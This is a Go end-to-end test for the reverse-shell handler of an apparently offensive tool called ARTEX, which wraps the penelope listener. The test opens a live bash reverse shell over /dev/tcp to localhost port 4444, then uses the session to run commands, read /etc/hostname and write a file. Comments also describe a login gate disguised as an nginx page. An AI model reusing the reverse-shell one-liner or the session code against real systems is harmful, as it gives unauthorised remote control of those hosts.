//go:build reversee2e

// reverse_e2e_test.go はフェーズ 5 リバース handler の実機エンドツーエンド検証(通常のテストには入らない。
// -tags reversee2e でクロスコンパイルし、penelope が入った Linux の演習機で実行する):
// 管理下で本物の penelope を起動 → ローカルから bash でリバース接続 → SyncSessions が sessions 台帳へ登録 →
// ブリッジ経由の Exec/ReadFile/WriteFile → 稼働中の HTTP API /api/sessions で見える → リバース
// クライアントを落とすとセッションが正直に dead になる。必要な env:
//
//	ARTEX_E2E_DSN       postgres DSN(セッション台帳のある DB)
//	ARTEX_E2E_JWTKEY    jwt.key のパス(sessions secret の暗号鍵を派生)
//	ARTEX_PENELOPE_PATH penelope.py のパス
//	ARTEX_E2E_API       稼働中の ARTEX API ベース URL(例 http://127.0.0.1:8787)
//	ARTEX_E2E_ADMINPASS 管理者パスワード(ログインして JWT を取得)
package server

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

func e2eEnv(t *testing.T, key string) string {
	t.Helper()
	v := strings.TrimSpace(os.Getenv(key))
	if v == "" {
		t.Skipf("env %s がありません。実機 e2e をスキップ", key)
	}
	return v
}

func TestReverseHandlerE2E(t *testing.T) {
	dsn := e2eEnv(t, "ARTEX_E2E_DSN")
	jwtPath := e2eEnv(t, "ARTEX_E2E_JWTKEY")
	e2eEnv(t, "ARTEX_PENELOPE_PATH") // newPenelopeHandler がこの env を読む
	apiBase := e2eEnv(t, "ARTEX_E2E_API")
	adminPass := e2eEnv(t, "ARTEX_E2E_ADMINPASS")

	jwtKey, err := os.ReadFile(jwtPath)
	if err != nil {
		t.Fatalf("jwt.key の読み取りに失敗: %v", err)
	}
	pg, err := db.Open(dsn)
	if err != nil {
		t.Fatalf("DB 接続に失敗: %v", err)
	}
	defer pg.Close()

	ctx := context.Background()
	store := db.NewSessionStore(pg, jwtKey)
	reg := session.NewRegistry()

	// 事前整理:前回の実行で残った alive の reverse 行を dead にする(initReverse と同じ意味論)。台帳はきれいな状態から始める。
	recs, err := store.List(ctx, db.SessionAlive)
	if err != nil {
		t.Fatalf("台帳の読み取りに失敗: %v", err)
	}
	for _, r := range recs {
		if r.Kind == "reverse" {
			_ = store.UpdateStatus(ctx, r.ID, db.SessionDead)
			t.Logf("事前整理:残っていた reverse セッション %d を dead に", r.ID)
		}
	}

	h := newPenelopeHandler(ctx, t.TempDir(), store, reg)
	defer func() {
		h.close()
		time.Sleep(time.Second) // Wait の監視 goroutine(onExit)が台帳の片付けを終えるのを待つ
	}()

	// 1. handler を管理下で起動(シングルトンの遅延起動:プロセス台帳/ログ/ポート登録)。
	if err := h.ensure(ctx, 4444, "127.0.0.1", 0, 0); err != nil {
		t.Fatalf("ensure に失敗: %v", err)
	}
	t.Logf("handler 起動済み: 127.0.0.1:4444 を待受, MCP %s, ログ %s", h.mcpURL, h.logPath(4444))

	// 2. ローカルからリバース接続を作る(exec で自身を置き換え:プロセスを落とせば socket が切れ、死亡検出を検証できる)。
	client := exec.Command("bash", "-c", "exec bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")
	if err := client.Start(); err != nil {
		t.Fatalf("リバースクライアントの起動に失敗: %v", err)
	}
	defer func() { _ = client.Process.Kill(); _, _ = client.Process.Wait() }()

	// 3. SyncSessions がセッションを認識し、台帳/レジストリへ登録する。
	var dbID int64
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		n, err := h.SyncSessions(ctx)
		if err != nil {
			t.Logf("SyncSessions: %v(再試行)", err)
		} else if n > 0 {
			for _, s := range reg.List() {
				if s.Kind() == "reverse" {
					dbID = s.ID()
				}
			}
			if dbID > 0 {
				break
			}
		}
		time.Sleep(time.Second)
	}
	if dbID == 0 {
		t.Fatal("30s 以内にリバースセッションの登録を待てなかった")
	}
	t.Logf("リバースセッションを登録済み: sessions テーブル id=%d", dbID)

	sess, ok := reg.Get(dbID)
	if !ok {
		t.Fatalf("レジストリからセッション %d を取得できない", dbID)
	}

	// 4. ブリッジ経由の Exec で 'id' の出力を取得。
	stdout, stderr, err := sess.Exec(ctx, "id; hostname", 15*time.Second)
	if err != nil {
		t.Fatalf("ブリッジ Exec に失敗: %v", err)
	}
	t.Logf("Exec 'id; hostname' → stdout=%q stderr=%q", stdout, stderr)
	if !strings.Contains(stdout, "uid=") {
		t.Fatalf("Exec の出力に uid= がない: %q", stdout)
	}

	// 5. ブリッジの Test(echo センチネル)。
	if err := sess.Test(ctx); err != nil {
		t.Fatalf("センチネルプローブに失敗: %v", err)
	}
	t.Log("センチネルプローブ成功")

	// 6. ReadFile / WriteFile で MCP 経由のダウンロード/アップロード。
	data, err := sess.ReadFile(ctx, "/etc/hostname")
	if err != nil {
		t.Fatalf("ReadFile に失敗: %v", err)
	}
	t.Logf("ReadFile /etc/hostname → %q", strings.TrimSpace(string(data)))
	if err := sess.WriteFile(ctx, "/tmp/artex_reverse_e2e.txt", []byte("ARTEX-REVERSE-E2E-OK")); err != nil {
		t.Fatalf("WriteFile に失敗: %v", err)
	}
	wout, _, err := sess.Exec(ctx, "cat /tmp/artex_reverse_e2e.txt", 10*time.Second)
	if err != nil || !strings.Contains(wout, "ARTEX-REVERSE-E2E-OK") {
		t.Fatalf("WriteFile の読み戻し検証に失敗: out=%q err=%v", wout, err)
	}
	t.Log("WriteFile + ターゲット側の読み戻し検証に成功")

	// 7. 稼働中の ARTEX API /api/sessions でこのセッションが見える(kind=reverse, alive)。
	// F14 偽装ゲート：ARTEX_E2E_GATEPATH(例 /g-<token>)を設定した場合は先にハンドシェイクして署名 cookie を取る。
	hc := e2eHTTPClient(t, apiBase)
	token := e2eLogin(t, hc, apiBase, adminPass)
	item := e2eFindSession(t, hc, apiBase, token, dbID)
	if item["kind"] != "reverse" || item["status"] != "alive" {
		t.Fatalf("/api/sessions の行が一致しない: %v", item)
	}
	t.Logf("/api/sessions で可視: id=%v kind=%v url=%v status=%v", item["id"], item["kind"], item["url"], item["status"])

	// 8. 死亡を正直に:リバースクライアントを落とす。注意点として penelope の自動昇格は python agent を配信する
	// (独立プロセスで別のリバース socket を張る。実測:元の payload プロセスを落としても agent は影響を受けない)。
	// セッションの死亡 = agent プロセスの死亡。4444 の対向プロセスをすべて落としてターゲット側の全滅を模擬する。
	_ = client.Process.Kill()
	_, _ = client.Process.Wait()
	if out, err := exec.Command("bash", "-c",
		"ss -tnp | grep ':4444' | grep -o 'pid=[0-9]*' | cut -d= -f2 | sort -u").Output(); err == nil {
		for _, pid := range strings.Fields(string(out)) {
			// handler 自身の penelope プロセスはスキップ(待受側で、ss の出力にも現れる)。
			h.mu.Lock()
			selfPid := 0
			if h.cmd != nil && h.cmd.Process != nil {
				selfPid = h.cmd.Process.Pid
			}
			h.mu.Unlock()
			if pid != fmt.Sprint(selfPid) {
				_ = exec.Command("kill", "-9", pid).Run()
				t.Logf("ターゲット側の残存プロセス pid=%s を停止", pid)
			}
		}
	}
	deadOK := false
	for i := 0; i < 30; i++ {
		if _, err := h.SyncSessions(ctx); err != nil {
			t.Logf("SyncSessions: %v(再試行)", err)
		}
		rec, err := store.Get(ctx, dbID)
		if err == nil && rec != nil && rec.Status == db.SessionDead {
			deadOK = true
			break
		}
		time.Sleep(time.Second)
	}
	if !deadOK {
		// 失敗時は penelope ログの末尾を出し、死亡検出がどこで止まったかを特定しやすくする。
		if out, err := exec.Command("bash", "-c", "tail -20 '"+h.logPath(4444)+"'").Output(); err == nil {
			t.Logf("penelope ログの末尾:\n%s", string(out))
		}
		t.Fatal("リバース接続が切れた後にセッションが dead にならない")
	}
	if _, ok := reg.Get(dbID); ok {
		t.Fatal("死亡したセッションはレジストリから外れるべき")
	}
	t.Log("リバース接続の切断後、セッションは正直に dead になりレジストリから外れた")

	// 9. 後片付け：e2e の台帳行を削除し、台帳を汚さない。
	_ = store.Delete(ctx, dbID)
	t.Log("e2e の台帳行を削除しました")
}

// e2eHTTPClient は cookie jar 付きの HTTP クライアントを作る;ARTEX_E2E_GATEPATH を設定した場合は先に
// F14 偽装ゲートのハンドシェイクを行う(POST password=<path のランダム部分> で署名 cookie を得る)。
func e2eHTTPClient(t *testing.T, apiBase string) *http.Client {
	t.Helper()
	jar, err := cookiejar.New(nil)
	if err != nil {
		t.Fatal(err)
	}
	hc := &http.Client{Jar: jar, Timeout: 15 * time.Second}
	gatePath := strings.TrimSpace(os.Getenv("ARTEX_E2E_GATEPATH"))
	if gatePath == "" {
		return hc
	}
	token := strings.TrimPrefix(strings.TrimPrefix(gatePath, "/"), "g-")
	form := url.Values{"password": {token}}
	req, _ := http.NewRequest("POST", apiBase+gatePath, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// 成功 = 303 で / へリダイレクトし署名 cookie を配信;失敗/レート制限はバイト単位で nginx ページに偽装(200)。
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("ゲートのハンドシェイクに失敗: %v", err)
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	u, _ := url.Parse(apiBase)
	if len(hc.Jar.Cookies(u)) == 0 {
		t.Fatal("ゲートのハンドシェイク後に cookie がない(パスワード不一致かレート制限)")
	}
	t.Log("F14 ゲートのハンドシェイク成功(署名 cookie を取得)")
	return hc
}

// e2eLogin は稼働中の ARTEX にログインして access token を取る。
func e2eLogin(t *testing.T, hc *http.Client, apiBase, pass string) string {
	t.Helper()
	body := fmt.Sprintf(`{"username":"ARTEX","password":%q}`, pass)
	req, _ := http.NewRequest("POST", apiBase+"/api/auth/login", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("ログインリクエストに失敗: %v", err)
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		t.Fatalf("ログインに失敗 %d: %s", resp.StatusCode, data)
	}
	var out map[string]any
	if err := json.Unmarshal(data, &out); err != nil {
		t.Fatalf("ログインレスポンスの解析に失敗: %v", err)
	}
	for _, k := range []string{"access_token", "token", "accessToken"} {
		if v, ok := out[k].(string); ok && v != "" {
			return v
		}
	}
	t.Fatalf("ログインレスポンスに access token がない: %s", data)
	return ""
}

// e2eFindSession は /api/sessions から指定 id の行を探す。
func e2eFindSession(t *testing.T, hc *http.Client, apiBase, token string, id int64) map[string]any {
	t.Helper()
	req, _ := http.NewRequest("GET", apiBase+"/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := hc.Do(req)
	if err != nil {
		t.Fatalf("/api/sessions のリクエストに失敗: %v", err)
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		t.Fatalf("/api/sessions %d: %s", resp.StatusCode, data)
	}
	var out struct {
		Items []map[string]any `json:"items"`
	}
	if err := json.Unmarshal(data, &out); err != nil {
		t.Fatalf("/api/sessions の解析に失敗: %v", err)
	}
	for _, it := range out.Items {
		if idf, ok := it["id"].(float64); ok && int64(idf) == id {
			return it
		}
	}
	t.Fatalf("/api/sessions にセッション %d が見つからない: %s", id, data)
	return nil
}
